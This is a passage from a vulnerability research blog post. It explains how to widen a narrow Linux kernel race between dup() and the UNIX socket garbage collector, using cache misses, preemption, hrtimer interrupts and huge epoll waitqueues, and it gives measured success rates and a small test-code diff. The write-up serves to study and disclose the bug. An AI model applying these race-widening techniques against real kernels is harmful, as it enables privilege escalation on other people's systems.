cache line in the FD table to be hot, we should choose the FD number for the warm-up run such that it uses the same cache line of the file descriptor table.&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c15" id="h.pfod85irgmms"&gt;&lt;span class="c8"&gt;An interruption&lt;/span&gt;&lt;/h1&gt; &lt;p class="c3"&gt;&lt;span&gt;Okay, a cache miss might be something like a few dozen or maybe hundred nanoseconds or so - that&amp;#39;s better, but it&amp;#39;s not &lt;/span&gt;&lt;span class="c16"&gt;great&lt;/span&gt;&lt;span&gt;. What &lt;/span&gt;&lt;span&gt;else can we do to make this tiny&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;piece of code much slower to execute?&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;On Android, kernels normally set &lt;/span&gt;&lt;span class="c4"&gt;CONFIG_PREEMPT&lt;/span&gt;&lt;span&gt;, which would&amp;#39;ve allowed abusing the scheduler to somehow interrupt the execution of this code. The way I&amp;#39;ve done this in the past was to give the victim thread a low scheduler priority and pin it to a specific CPU core together with another high-priority thread that is blocked on a &lt;/span&gt;&lt;span class="c4"&gt;read()&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;syscall on an empty pipe (or eventfd); when data is written to the pipe from another CPU core, the pipe becomes readable, so the high-priority thread (which is registered on the pipe&amp;#39;s waitqueue) becomes schedulable, and an inter-processor interrupt (IPI) is sent to the victim&amp;#39;s CPU core to force it to enter the scheduler immediately.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;One problem with that approach, aside from its reliance on &lt;/span&gt;&lt;span class="c4"&gt;CONFIG_PREEMPT&lt;/span&gt;&lt;span class="c1"&gt;, is that any timing variability in the kernel code involved in sending the IPI makes it harder to actually preempt the victim thread in the right spot.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;(Thanks to the &lt;/span&gt;&lt;span class="c11"&gt;&lt;a class="c121" href="https://xenproject.org/users/security/"&gt;Xen security team&lt;/a&gt;&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;- I think the first time I heard the idea of using an interrupt to widen a race window might have been from them.)&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c15" id="h.u9iu9sq2l8r"&gt;&lt;span&gt;Setting an alarm&lt;/span&gt;&lt;/h1&gt; &lt;p class="c3"&gt;&lt;span&gt;A better way to do this on an Android phone would be to trigger the scheduler not from an IPI, but from an expiring high-resolution timer on the same core&lt;/span&gt;&lt;span&gt;, although I didn&amp;#39;t get it to work (probably because my code was broken in unrelated ways)&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;High-resolution timers (hrtimers) are exposed through many userspace APIs. Even the timeout of &lt;/span&gt;&lt;span class="c4"&gt;select()&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span class="c4"&gt;pselect()&lt;/span&gt;&lt;span&gt;&amp;nbsp;uses an hrtimer, although this is an hrtimer that normally has some slack applied to it to allow batching it with timers that are scheduled to expire a bit later. An example of a non-hrtimer-based API is the timeout used for reading from a UNIX domain socket (and probably also other types of sockets?), which can be set via &lt;/span&gt;&lt;span class="c4"&gt;SO_RCVTIMEO&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;The thing that makes hrtimers &amp;quot;high-resolution&amp;quot; is that they don&amp;#39;t just wait for the next periodic clock tick to arrive; instead, the expiration time of the next hrtimer on the CPU core is programmed into a hardware timer. So we could set an absolute hrtimer for some time in the future via something like &lt;/span&gt;&lt;span class="c4"&gt;timer_settime()&lt;/span&gt;&lt;span&gt;&amp;nbsp;or &lt;/span&gt;&lt;span class="c4"&gt;timerfd_settime()&lt;/span&gt;&lt;span class="c1"&gt;, and then at exactly the programmed time, the hardware will raise an interrupt! We&amp;#39;ve made the timing behavior of the OS irrelevant for the second side of the race, the only thing that matters is the hardware! Or... well, almost...&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c15" id="h.v6rvu85hdhx3"&gt;&lt;span class="c8"&gt;[Sidenote] Absolute timers: Not quite absolute&lt;/span&gt;&lt;/h1&gt; &lt;p class="c3"&gt;&lt;span&gt;So we pick some absolute time at which we want to be interrupted, and tell the kernel using a syscall that accepts an absolute time, in nanoseconds. And then when that timer is the next one scheduled, the OS converts the absolute time to whatever clock base/scale the hardware timer is based on, and programs it into hardware. And the hardware usually supports programming timers with absolute time - e.g. on modern X86 (with &lt;/span&gt;&lt;span class="c4"&gt;X86_FEATURE_TSC_DEADLINE_TIMER&lt;/span&gt;&lt;span&gt;), you can simply write an absolute Time Stamp Counter(TSC) deadline into &lt;/span&gt;&lt;span class="c4"&gt;MSR_IA32_TSC_DEADLINE&lt;/span&gt;&lt;span&gt;, and when that deadline is reached, you get an interrupt. The situation on arm64 is similar, using the timer&amp;#39;s comparator register (&lt;/span&gt;&lt;span class="c4"&gt;CVAL&lt;/span&gt;&lt;span class="c1"&gt;).&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;However, on both X86 and arm64, even though the clockevent subsystem is theoretically able to give absolute timestamps to clockevent drivers (via &lt;/span&gt;&lt;span class="c4"&gt;-&amp;gt;set_next_ktime()&lt;/span&gt;&lt;span&gt;), the drivers instead only implement &lt;/span&gt;&lt;span class="c4"&gt;-&amp;gt;set_next_event()&lt;/span&gt;&lt;span class="c1"&gt;, which takes a relative time as argument. This means that the absolute timestamp has to be converted into a relative one, only to be converted back to absolute a short moment later. The delay between those two operations is essentially added to the timer&amp;#39;s expiration time.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;Luckily this didn&amp;#39;t really seem to be a problem for me; if it was, I would have tried to repeatedly call &lt;/span&gt;&lt;span class="c4"&gt;timerfd_settime()&lt;/span&gt;&lt;span&gt;&amp;nbsp;shortly before the planned expiry time to ensure that the last time the hardware timer is programmed, the relevant code path is hot in the caches. (I did do some experimentation on arm64, where this seemed to &lt;/span&gt;&lt;span class="c16"&gt;maybe&lt;/span&gt;&lt;span&gt;&amp;nbsp;help a tiny bit, but I didn&amp;#39;t really analyze it properly.)&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c15" id="h.dtkpi9hjsrrs"&gt;&lt;span class="c8"&gt;A really big list of things to do&lt;/span&gt;&lt;/h1&gt; &lt;p class="c3"&gt;&lt;span&gt;Okay, so all the stuff I said above would be helpful on an Android phone with &lt;/span&gt;&lt;span class="c4"&gt;CONFIG_PREEMPT&lt;/span&gt;&lt;span class="c1"&gt;, but what if we&amp;#39;re trying to target a normal desktop/server kernel that doesn&amp;#39;t have that turned on?&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;Well, we can still trigger hrtimer interrupts the same way - we just can&amp;#39;t use them to immediately enter the scheduler and preempt the thread anymore. But instead of using the interrupt for preemption, we could just try to make the interrupt handler run for a really long time.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;Linux has the concept of a &amp;quot;timerfd&amp;quot;, which is a file descriptor that refers to a timer. You can e.g. call &lt;/span&gt;&lt;span class="c4"&gt;read()&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;on a timerfd, and that operation will block until the timer has expired. Or you can monitor the timerfd using epoll, and it will show up as readable when the timer expires.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;When a timerfd becomes ready, all the timerfd&amp;#39;s waiters (including epoll watches), which are queued up in a linked list, are woken up via the &lt;/span&gt;&lt;span class="c4"&gt;wake_up()&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;path - just like when e.g. a pipe becomes readable. Therefore, if we can make the list of waiters really long, the interrupt handler will have to spend a lot of time iterating over that list.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;And for any waitqueue that is wired up to a file descriptor, it is fairly easy to add a ton of entries thanks to epoll. Epoll ties its watches to specific FD numbers, so if you duplicate an FD with hundreds of &lt;/span&gt;&lt;span class="c4"&gt;dup()&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;calls, you can then use a single epoll instance to install hundreds of waiters on the file. Additionally, a single process can have lots of epoll instances. I used 500 epoll instances and 100 duplicate FDs, resulting in 50 000 waitqueue items.&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c15" id="h.gyrfobw0uoov"&gt;&lt;span&gt;Measuring race outcomes&lt;/span&gt;&lt;/h1&gt; &lt;p class="c3"&gt;&lt;span&gt;A nice aspect of this race condition is that if you only hit the difficult race (&lt;/span&gt;&lt;span class="c4"&gt;close()&lt;/span&gt;&lt;span&gt;&amp;nbsp;the FD and run &lt;/span&gt;&lt;span class="c4"&gt;unix_gc()&lt;/span&gt;&lt;span&gt;&amp;nbsp;while &lt;/span&gt;&lt;span class="c4"&gt;dup()&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;is preempted between FD table lookup and refcount increment), no memory corruption happens yet, but you can observe that the GC has incorrectly removed a socket buffer (SKB) from the victim socket. Even better, if the race fails, you can also see in which direction it failed, as long as no FDs below the victim FD are unused:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style="padding: 0;" class="c20 lst-kix_oh8g77k3z2ge-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c3 c14 li-bullet-0"&gt;&lt;span&gt;If &lt;/span&gt;&lt;span class="c4"&gt;dup()&lt;/span&gt;&lt;span&gt;&amp;nbsp;returns -1, it was called too late / the interrupt happened too soon: The &lt;/span&gt;&lt;span class="c4"&gt;file*&lt;/span&gt;&lt;span&gt;&amp;nbsp;was already gone from the FD table when &lt;/span&gt;&lt;span class="c4"&gt;__fget_files()&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;tried to load it.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c3 c14 li-bullet-0"&gt;&lt;span&gt;If &lt;/span&gt;&lt;span class="c4"&gt;dup()&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;returns a file descriptor:&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ul style="padding: 0;" class="c20 lst-kix_oh8g77k3z2ge-1 start"&gt;&lt;li style="margin-left: 46pt;" class="c3 c21 li-bullet-0"&gt;&lt;span&gt;If it returns an FD higher than the victim FD, this implies that the victim FD was only closed after &lt;/span&gt;&lt;span class="c4"&gt;dup()&lt;/span&gt;&lt;span&gt;&amp;nbsp;had already elevated the refcount and allocated a new FD. This means &lt;/span&gt;&lt;span class="c4"&gt;dup()&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;was called too soon / the interrupt happened too late.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c3 c21 li-bullet-0"&gt;&lt;span class="c1"&gt;If it returns the old victim FD number:&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ul style="padding: 0;" class="c20 lst-kix_oh8g77k3z2ge-2 start"&gt;&lt;li style="margin-left: 46pt;" class="c3 c17 li-bullet-0"&gt;&lt;span&gt;If &lt;/span&gt;&lt;span class="c4"&gt;recvmsg()&lt;/span&gt;&lt;span&gt;&amp;nbsp;on the FD returned by &lt;/span&gt;&lt;span class="c4"&gt;dup()&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;returns no data, it means the race succeeded: The GC wrongly removed the queued SKB.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c3 c17 li-bullet-0"&gt;&lt;span&gt;If &lt;/span&gt;&lt;span class="c4"&gt;recvmsg()&lt;/span&gt;&lt;span&gt;&amp;nbsp;returns data, the interrupt happened between the refcount increment and the allocation of a new FD. &lt;/span&gt;&lt;span class="c4"&gt;dup()&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;was called a little bit too soon / the interrupt happened a little bit too late.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;Based on this, I repeatedly tested different timing offsets, using a spinloop with a variable number of iterations to skew the timing, and plotted what outcomes the race attempts had depending on the timing skew.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c26" id="h.8e0qhvge46uf"&gt;&lt;span class="c22 c23"&gt;Results: Debian kernel, on Tiger Lake&lt;/span&gt;&lt;/h2&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;I tested this on a Tiger Lake laptop, with the same kernel as shown in the disassembly. Note that &amp;quot;0&amp;quot; on the X axis is offset -300 ns relative to the timer&amp;#39;s programmed expiry.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;&lt;a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhuMDxml-egYM78-ktGQ6EGTqSbY05psG-f4LspmGu4yezOf-EcECjSkJfj6tWirft2IrPiD5C2SfTSleylFckDolapTVZMbxCbPAGDvq3pze1asfz0_6b7Doj4R3hQb9QCT8THR3tcnrxILjDNSKZV6HOSFuDYPn1QhJ6tupmzAbP6mqHomgd-Hza9EA/s580/image12.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhuMDxml-egYM78-ktGQ6EGTqSbY05psG-f4LspmGu4yezOf-EcECjSkJfj6tWirft2IrPiD5C2SfTSleylFckDolapTVZMbxCbPAGDvq3pze1asfz0_6b7Doj4R3hQb9QCT8THR3tcnrxILjDNSKZV6HOSFuDYPn1QhJ6tupmzAbP6mqHomgd-Hza9EA/s580/image12.png" border="0" alt="This graph shows histograms of race attempt outcomes (too early, success, or too late), with the timing offset at which the outcome occurred on the X axis. The graph shows that depending on the timing offset, up to around 1/3 of race attempts succeeded." style="max-height: 750; max-width: 600;"title="This graph shows histograms of race attempt outcomes (too early, success, or too late), with the timing offset at which the outcome occurred on the X axis. The graph shows that depending on the timing offset, up to around 1/3 of race attempts succeeded." /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c26" id="h.9b7pdk4c8xov"&gt;&lt;span&gt;Results: Other kernel, on Skylake&lt;/span&gt;&lt;/h2&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;&lt;a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEimQ-1J6OorowaHQQmyc--zzXtYP1EZzBpzjJ-jq_KBxmrFB3D0n5p9ENdijUbenfSy2NF7qU_26fnMr9UHMz0iPSQPF-7QUXzpW_AlGXuUZ9z1q3RkWqtImLiE4W0BSM8VdSXlyr5v78ymoWNd68uZ736e5KSnfZtmrxGZu6wBejVtPV5v4MJJJo3BLw/s652/image8.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEimQ-1J6OorowaHQQmyc--zzXtYP1EZzBpzjJ-jq_KBxmrFB3D0n5p9ENdijUbenfSy2NF7qU_26fnMr9UHMz0iPSQPF-7QUXzpW_AlGXuUZ9z1q3RkWqtImLiE4W0BSM8VdSXlyr5v78ymoWNd68uZ736e5KSnfZtmrxGZu6wBejVtPV5v4MJJJo3BLw/s600/image8.png" border="0" alt="This graph shows similar histograms for a Skylake processor. The exact distribution is different, but again, depending on the timing offset, around 1/3 of race attempts succeeded." style="max-height: 750; max-width: 600;"title="This graph shows similar histograms for a Skylake processor. The exact distribution is different, but again, depending on the timing offset, around 1/3 of race attempts succeeded." /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;These measurements are from an older laptop with a Skylake CPU, running a different kernel. Here &amp;quot;0&amp;quot; on the X axis is offset -1 us relative to the timer. (T&lt;/span&gt;&lt;span&gt;hese timings are from a system that&amp;#39;s running a different kernel from &lt;/span&gt;&lt;span class="c1"&gt;the one shown above, but I don&amp;#39;t think that makes a difference.)&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;The exact timings of course look different between CPUs, and they probably also change based on CPU frequency scaling? But still, if you know what the right timing is (or measure the machine&amp;#39;s timing before attempting to actually exploit the bug), you could hit this narrow race with a success rate of about 30%!&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c15" id="h.5qhkbks84bg2"&gt;&lt;span class="c8"&gt;How important is the cache miss?&lt;/span&gt;&lt;/h1&gt; &lt;p class="c3"&gt;&lt;span&gt;The previous section showed that with the right timing, the race succeeds with a probability around 30% - but it doesn&amp;#39;t show whether the cache miss is actually important for that, or whether the race would still work fine without it. To verify that, I patched my test code to try to make the file&amp;#39;s &lt;/span&gt;&lt;span&gt;cache line hot (present in the cache) instead of cold (not present in the cache):&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c10 c4"&gt;@@ -312,8 +312,10 @@&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c10 c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c10 c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c10 c4"&gt;+#if 0&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c10 c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;// bounce socket&amp;#39;s file refcount over to other cpu&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c10 c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;pin_to(2);&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c10 c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;close(SYSCHK(dup(RESURRECT_FD+1-1)));&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c4 c10"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;pin_to(1);&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c10 c4"&gt;+#endif&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c10 c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c4 c24"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;//printf(&amp;quot;setting timer\n&amp;quot;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c10 c4"&gt;@@ -352,5 +354,5 @@&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c10 c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;close(loop_root);&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c10 c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;while (ts_is_in_future(spin_stop))&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c10 c4"&gt;- &amp;nbsp; &amp;nbsp; &amp;nbsp;close(SYSCHK(dup(FAKE_RESURRECT_FD)));&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c10 c4"&gt;+ &amp;nbsp; &amp;nbsp; &amp;nbsp;close(SYSCHK(dup(RESURRECT_FD)));&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c10 c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;while (ts_is_in_future(my_launch_ts)) /*spin*/;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;With that patch, the race outcomes look like this on the Tiger Lake laptop:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;&lt;a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi9avN3W5e4BGOgUr2wKyhDS767uKhmfLASj_KqKvIo3-Zo6LtGH537g_UAvVOFZ3QfEIECUGweASvgTFKNAmmy_MmWA2oGYn8ijD-Mn6JPEMt2S_mDM54-iS9kIX_p9LuofPB8cD3Nmk5SE0RKftVseOJ8KmHqqAvINyI407B5OYNL_Yr9zXZxLgXlFQ/s659/image2.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi9avN3W5e4BGOgUr2wKyhDS767uKhmfLASj_KqKvIo3-Zo6LtGH537g_UAvVOFZ3QfEIECUGweASvgTFKNAmmy_MmWA2oGYn8ijD-Mn6JPEMt2S_mDM54-iS9kIX_p9LuofPB8cD3Nmk5SE0RKftVseOJ8KmHqqAvINyI407B5OYNL_Yr9zXZxLgXlFQ/s600/image2.png" border="0" alt="This graph is a histogram of race outcomes depending on timing offset; it looks similar to the previous graphs, except that almost no race attempts succeed anymore." style="max-height: 750; max-width: 600;"title="This graph is a histogram of race outcomes depending on timing offset; it looks similar to the previous graphs, except that almost no race attempts succeed anymore." /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c15" id="h.7bhmtfdoxeqe"&gt;&lt;span class="c8"&gt;But wait, those graphs make no sense!&lt;/span&gt;&lt;/h1&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;If you&amp;#39;ve been paying attention, you may have noticed that the timing graphs I&amp;#39;ve been showing are really weird. If we were deterministically hitting the race in exactly the same way every time, the timing graph should look like this (looking just at the &amp;quot;too-early&amp;quot; and &amp;quot;too-late&amp;quot; cases for simplicity):&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;&lt;a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh6_04LyOciCrij6wwDqf1uRvEy1zNGCNvZsY5rp37uqa_HDnEJAQQRjRBpCgEnRmkflIgPLrkZK2Jg5V0X_C43bxLrn7906WDwKuNa_1zBVGxxe16rwZgyPOAKohhrowTj-Xf37UuVkXi3gybVk8wlX6OxgRxSzkc-lqhnXmM4816mK-xVh7m86pZVtg/s359/image6.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh6_04LyOciCrij6wwDqf1uRvEy1zNGCNvZsY5rp37uqa_HDnEJAQQRjRBpCgEnRmkflIgPLrkZK2Jg5V0X_C43bxLrn7906WDwKuNa_1zBVGxxe16rwZgyPOAKohhrowTj-Xf37UuVkXi3gybVk8wlX6OxgRxSzkc-lqhnXmM4816mK-xVh7m86pZVtg/s359/image6.png" border="0" alt="A sketch of a histogram of race outcomes where the &amp;quot;too early&amp;quot; outcome suddenly drops from 100% probability to 0% probability, and a bit afterwards, the &amp;quot;too late&amp;quot; outcome jumps from 0% probability to 100%" style="max-height: 750; max-width: 600;"title="A sketch of a histogram of race outcomes where the &amp;quot;too early&amp;quot; outcome suddenly drops from 100% probability to 0% probability, and a bit afterwards, the &amp;quot;too late&amp;quot; outcome jumps from 0% probability to 100%" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;Sure, maybe there is some microarchitectural state that is different between runs, causing timing variations - cache state, branch predictor state, frequency scaling, or something along those lines -, but a small number of discrete events that haven&amp;#39;t been accounted for should be adding steps to the graph. (If you&amp;#39;re mathematically inclined, you can model that as the result of a convolution of the ideal timing graph with the timing delay distributions of individual discrete events.) For two unaccounted events, that might look like this:&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;&lt;a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhrUoPbFMiuzGjxO8Wc6oKMOFbulwITmOuJPMV-xSYffwA-3AjMWp_GbBqbPblxYMsayVXVXxoGq0FN0viOunP0e7Nldp4REeQPiP5RvZ8vt-UorP4vFdRBqDADFaqBArjEiAs8edCfez0FdJ9IX1PMIENR6_8Vk0I3prhG7XKNRwJTiSmbJd70AwmnEw/s359/image18.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhrUoPbFMiuzGjxO8Wc6oKMOFbulwITmOuJPMV-xSYffwA-3AjMWp_GbBqbPblxYMsayVXVXxoGq0FN0viOunP0e7Nldp4REeQPiP5RvZ8vt-UorP4vFdRBqDADFaqBArjEiAs8edCfez0FdJ9IX1PMIENR6_8Vk0I3prhG7XKNRwJTiSmbJd70AwmnEw/s359/image18.png" border="0" alt="A sketch of a histogram of race outcomes where the &amp;quot;too early&amp;quot; outcome drops from 100% probability to 0% probability in multiple discrete steps, and overlapping that, the &amp;quot;too late&amp;quot; outcome goes up from 0% probability to 100% in multiple discrete steps" style="max-height: 750; max-width: 600;"title="A sketch of a histogram of race outcomes where the &amp;quot;too early&amp;quot; outcome drops from 100% probability to 0% probability in multiple discrete steps, and overlapping that, the &amp;quot;too late&amp;quot; outcome goes up from 0% probability to 100% in multiple discrete steps" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;But what the graphs are showing is more of a smooth, linear transition, like this:&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;&lt;a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjFfiLezs131LfoNOHCsoIN0_3E4xIiDQUJOZD8fkFi44MC87ejAq-yS4-3EdJhWDzhhlAUeMH4TUfL6sSJRjaCYRSydYLLhBpiv97SNExvmWj_LKtTA_JT5DZl5n-2kb_2Rwrkg7C_bOKsI85DfwOo5ae6bBlqYjph38H5pBZBIkTG8OYF5nT8N-KFAQ/s359/image13.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjFfiLezs131LfoNOHCsoIN0_3E4xIiDQUJOZD8fkFi44MC87ejAq-yS4-3EdJhWDzhhlAUeMH4TUfL6sSJRjaCYRSydYLLhBpiv97SNExvmWj_LKtTA_JT5DZl5n-2kb_2Rwrkg7C_bOKsI85DfwOo5ae6bBlqYjph38H5pBZBIkTG8OYF5nT8N-KFAQ/s359/image13.png" border="0" alt="A sketch of a histogram of race outcomes where the &amp;quot;too early&amp;quot; outcome&amp;#39;s share linearly drops while the &amp;quot;too late&amp;quot; outcome&amp;#39;s share linearly rises" style="max-height: 750; max-width: 600;"title="A sketch of a histogram of race outcomes where the &amp;quot;too early&amp;quot; outcome&amp;#39;s share linearly drops while the &amp;quot;too late&amp;quot; outcome&amp;#39;s share linearly rises" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;And that seems to me like there&amp;#39;s still something fundamentally wrong. Sure, if there was a sufficiently large number of discrete events mixed together, the curve would eventually just look like a smooth smear - but it seems unlikely to me that there is such a large number of somewhat-evenly distributed random discrete events. And sure, we do get a small amount of timing inaccuracy from sampling the clock in a spinloop, but that should be bounded to the execution time of that spinloop, and the timing smear is far too big for that.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;So it looks like there is a source of randomness that 